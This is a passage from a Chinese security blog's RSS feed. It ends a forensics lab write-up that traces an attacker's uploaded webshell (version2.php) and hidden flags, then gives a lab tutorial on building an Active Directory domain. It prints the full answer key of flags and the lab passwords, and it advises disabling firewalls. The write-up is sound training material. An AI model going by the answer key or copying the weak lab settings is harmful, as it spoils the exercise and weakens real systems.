&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">先浏览一下过滤出来的报文&lt;/span>&lt;span class="err">，&lt;/span>&lt;span class="nx">发现攻击者访问了&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">flag1路径&lt;/span>&lt;span class="err">，&lt;/span>&lt;span class="nx">追踪http流&lt;/span>&lt;span class="err">。&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250829015622.png" alt="image.png">&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">发现了一个第一个flag&lt;/span>&lt;span class="err">：&lt;/span>&lt;span class="nx">flag1&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="nx">Network&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">_2020_Hack&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="err">，&lt;/span>&lt;span class="nx">提交判题程序得知正确&lt;/span>&lt;span class="err">。&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250829015637.png" alt="image.png">&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">答案&lt;/span>&lt;span class="err">：&lt;/span>&lt;span class="nx">flag1&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="nx">Network&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">_2020_Hack&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h1 id="6-提交攻击者使用的后续上传的木马文件名称">6. 提交攻击者使用的后续上传的木马文件名称&lt;/h1>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">查看数据包&lt;/span>&lt;span class="err">，&lt;/span>&lt;span class="nx">可以看出&lt;/span>&lt;span class="err">，&lt;/span>&lt;span class="nx">黑客上传了一个version2&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">php文件&lt;/span>&lt;span class="err">。&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250829015650.png" alt="image.png">&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">答案&lt;/span>&lt;span class="err">：&lt;/span>&lt;span class="nx">version2&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">php&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h1 id="7-提交攻击者隐藏的flag2">7. 提交攻击者隐藏的flag2&lt;/h1>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">根据命令可以看出&lt;/span>&lt;span class="err">，&lt;/span>&lt;span class="nx">黑客进入了127&lt;/span>&lt;span class="mf">.0.0.1&lt;/span>&lt;span class="nx">文件夹&lt;/span>&lt;span class="err">，&lt;/span>&lt;span class="nx">并创建了一个隐藏文件夹&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">api&lt;/span>&lt;span class="err">，&lt;/span>&lt;span class="nx">进入后查看&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250829015702.png" alt="image.png">&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">可以看出他编辑了这两个文件&lt;/span>&lt;span class="err">，&lt;/span>&lt;span class="nx">cat看一下&lt;/span>&lt;span class="err">。&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250829015711.png" alt="image.png">&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">cat&lt;/span> &lt;span class="nx">alinotify&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">php&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">发现flag2&lt;/span>&lt;span class="err">。&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250829015724.png" alt="image.png">&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">答案&lt;/span>&lt;span class="err">：$&lt;/span>&lt;span class="nx">flag2&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="s">&amp;#34;flag{bL5Frin6JVwVw7tJBdqXlHCMVpAenXI9In9}&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h1 id="8-提交攻击者隐藏的flag3">8. 提交攻击者隐藏的flag3&lt;/h1>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">使用命令&lt;/span>&lt;span class="err">：&lt;/span>&lt;span class="nx">history&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">查看历史使用过的命令可以发现&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250829015740.png" alt="image.png">&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">答案&lt;/span>&lt;span class="err">：&lt;/span>&lt;span class="nx">flag&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="mi">5&lt;/span>&lt;span class="nx">LourqoFt5d2zyOVUoVPJbOmeVmoKgcy6OZ&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h1 id="全部答案">全部答案：&lt;/h1>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;span class="lnt">8
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="mf">192.168.20.1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">Network&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="mi">2020&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nx">http&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="c1">//192.168.198.130/index.php?user-app-register&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">Network2020&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">flag1&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="nx">Network&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">_2020_Hack&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">version2&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">php&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">flag&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="nx">bL5Frin6JVwVw7tJBdqXlHCMVpAenXI9In9&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">flag&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="mi">5&lt;/span>&lt;span class="nx">LourqoFt5d2zyOVUoVPJbOmeVmoKgcy6OZ&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div></description></item><item><title>【内网】域环境搭建-01</title><link>http://localhost:1313/p/%E5%86%85%E7%BD%91%E5%9F%9F%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA-01/</link><pubDate>Wed, 27 Aug 2025 00:00:00 +0000</pubDate><guid>http://localhost:1313/p/%E5%86%85%E7%BD%91%E5%9F%9F%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA-01/</guid><description>&lt;img src="http://localhost:1313/images/1.webp" alt="Featured image of post 【内网】域环境搭建-01" />&lt;h1 id="0x00-前置知识">0x00 前置知识&lt;/h1>
&lt;p>需要三个windows_server虚拟机。&lt;br>
这里我使用2012做主域，只能上相兼容不能向下兼容。&lt;br>
使用windows_server_2012做主域，就不能使用2008做子域了。&lt;br>
这就可以看出一般&lt;strong>主域的服务器版本很低&lt;/strong>。&lt;br>
三台服务器分别为（域控）（子域）（辅域）&lt;/p>
&lt;h1 id="0x01-主域的搭建">0x01 主域的搭建&lt;/h1>
&lt;ol>
&lt;li>修改网络配置为自定义的一个网段（192.16.100.1/24），为了确保都在同一网段。&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250708143458.png" alt="image.png">&lt;/li>
&lt;li>关闭防火墙&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250708142930.png" alt="image.png">&lt;/li>
&lt;li>设置IP地址：192.168.100.100为域控的IP，后续DNS服务器地址就是192.168.100.100。&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250708143717.png" alt="image.png">&lt;/li>
&lt;li>修改名称：此电脑-&amp;gt;属性，修改名称为：DC，然后重启一下。&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250708144209.png" alt="image.png">&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250708144312.png" alt="image.png">&lt;/li>
&lt;li>添加角色服务，Active Directory域服务和DNS服务器，安装好之后会自动重启一下即可。&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250708143918.png" alt="image.png">&lt;/li>
&lt;li>配置域环境，添加新林为：slimer.com后，进行等待，大约2分钟左右&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250708145202.png" alt="image.png">&lt;/li>
&lt;li>输入自己设置的密码即可（p-0p-0p-0..）&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250708145326.png" alt="image.png">&lt;/li>
&lt;li>下一步&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250708145441.png" alt="image.png">&lt;/li>
&lt;li>默认即可&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250708145504.png" alt="image.png">&lt;/li>
&lt;li>默认即可&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250708145555.png" alt="image.png">&lt;/li>
&lt;li>安装，然后重启一下，完成域控的搭建。&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250708145715.png" alt="image.png">&lt;/li>
&lt;li>重启完成后，将网卡重启一下，就可以看到域环境了。&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250708150247.png" alt="image.png">&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250708150334.png" alt="image.png">&lt;/li>
&lt;li>这里会多出来一个域防火墙，记得给关了。&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250708151341.png" alt="image.png">&lt;/li>
&lt;/ol>
&lt;h1 id="0x02-子域的搭建">0x02 子域的搭建&lt;/h1>
&lt;ol>
&lt;li>关闭防火墙&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250708150448.png" alt="image.png">&lt;/li>
&lt;li>设置网卡为同一网段。&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250708150556.png" alt="image.png">&lt;/li>
&lt;li>设置IP地址，DNS为域控的IP地址。&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250708150708.png" alt="image.png">&lt;/li>
&lt;li>修改&lt;/li>
&lt;/ol>
&lt;ul>
&lt;li>&lt;input disabled="" type="checkbox"> 计算机名称为:RODCServer&lt;/li>
&lt;li>&lt;input disabled="" type="checkbox"> 隶属于slimer.com域&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250709102446.png" alt="image.png">&lt;/li>
&lt;/ul>
&lt;ol start="5">
&lt;li>改：&lt;/li>
&lt;/ol>
&lt;ul>
&lt;li>&lt;input disabled="" type="checkbox"> 计算机名改成administrator&lt;/li>
&lt;li>&lt;input disabled="" type="checkbox"> 密码为开机密码：p-0p-0p-0&lt;br>
重启查看一下是否成功连接到slimer.com域&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250709102537.png" alt="image.png">&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250709102642.png" alt="image.png">&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250709102907.png" alt="image.png">&lt;/li>
&lt;/ul>
&lt;ol start="6">
&lt;li>安装域环境，选好之后，直接下一步安装即可。&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250708151223.png" alt="image.png">&lt;/li>
&lt;li>部署子域，新域名为：RODCServer。&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250708151703.png" alt="image.png">&lt;/li>
&lt;li>换一下自己机器的凭据。&lt;/li>
&lt;/ol>
&lt;ul>
&lt;li>&lt;input disabled="" type="checkbox"> 账号：administrator&lt;/li>
&lt;li>&lt;input disabled="" type="checkbox"> 密码：p-0p-0p-0&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250709103128.png" alt="image.png">&lt;br>
9.设置密码（满足复杂度）&lt;/li>
&lt;li>&lt;input disabled="" type="checkbox"> 密码：p-0p-0p-0..&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250709103415.png" alt="image.png">&lt;br>
10.一直下一步，直到安装即可。&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250709103807.png" alt="image.png">&lt;br>
11.在工具中找到 AD域和信任关系&lt;/li>
&lt;li>&lt;input disabled="" type="checkbox"> 就可以进行配置了，这里先这样后续再处理。&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250709105606.png" alt="image.png">&lt;/li>
&lt;/ul>
&lt;h1 id="0x03-辅域的搭建">0x03 辅域的搭建&lt;/h1>
&lt;p>只读域控，辅助域控&lt;br>
只读域控制器（Read-only Domian Controller，RODC）的AD DS数据库只可以被读取，不可以被修改，也就是说用户或应用程序无法直接修改RODC 的AD DS数据库。RODC的AD DS数据库内容只能够从其他可读写的域控制器复制过来。RODC主要设计给远程分公司网络来使用的，因为一般来说远程分公 司的网络规模比较小，用户人数较少，此网络的安全措施或许并不如总公司完备，也可能缺乏IT技术人员，因此采用RODC可避免因其AD DS数据库被破坏 影响整个AD DS环境。&lt;br>
辅助域控制器，在主域控不工作的事情下，辅助可以顶替他继续工作。&lt;br>
安装SUBDCServer（辅域）&lt;br>
注意：IP地址不要重复 要提前关闭防火墙&lt;/p>
&lt;ol>
&lt;li>修改IP（如上步骤）IP地址修改（与域控不同）但（首选DNS服务器选择域控IP）&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250709110139.png" alt="image.png">&lt;/li>
&lt;li>右击（这台电脑）然后点击（属性）再点击（更改配置）然后点击（更改）最后&lt;/li>
&lt;/ol>
&lt;ul>
&lt;li>&lt;input disabled="" type="checkbox"> 计算机名改为（SUBDCServer）&lt;/li>
&lt;li>&lt;input disabled="" type="checkbox"> 属于选择（域）并添加为（slimer.com）&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250709110336.png" alt="image.png">&lt;/li>
&lt;/ul>
&lt;ol start="3">
&lt;li>改&lt;/li>
&lt;/ol>
&lt;ul>
&lt;li>&lt;input disabled="" type="checkbox"> 计算机名（administrator）&lt;/li>
&lt;li>&lt;input disabled="" type="checkbox"> 密码（开机密码）p-0p-0p-0&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250709110459.png" alt="image.png">&lt;/li>
&lt;/ul>
&lt;ol start="4">
&lt;li>添加该两个功能，直接默认安装即可。&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250709112504.png" alt="image.png">&lt;/li>
&lt;li>将此服务器提升为域控制器即可。&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250709112610.png" alt="image.png">&lt;/li>
&lt;li>点击 将域控制器添加到现有域 点击 更改 输入域控用户和密码&lt;/li>
&lt;/ol>
&lt;ul>
&lt;li>&lt;input disabled="" type="checkbox"> 账户：administrator&lt;/li>
&lt;li>&lt;input disabled="" type="checkbox"> 密码：p-0p-0p-0&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250709112737.png" alt="image.png">&lt;/li>
&lt;/ul>
&lt;ol start="4">
&lt;li>勾选域名系统服务器全局编录作为辅助域控输入密码（需要满足密码复杂性）&lt;/li>
&lt;/ol>
&lt;ul>
&lt;li>&lt;input disabled="" type="checkbox"> 密码：p-0p-0p-0..&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250709112920.png" alt="image.png">&lt;/li>
&lt;/ul>
&lt;ol start="4">
&lt;li>复制自 选为 DC.slimer.com&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250709113039.png" alt="image.png">&lt;/li>
&lt;li>点击下一步 一直到 安装&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250709113120.png" alt="image.png">&lt;/li>
&lt;/ol></description></item></channel></rss>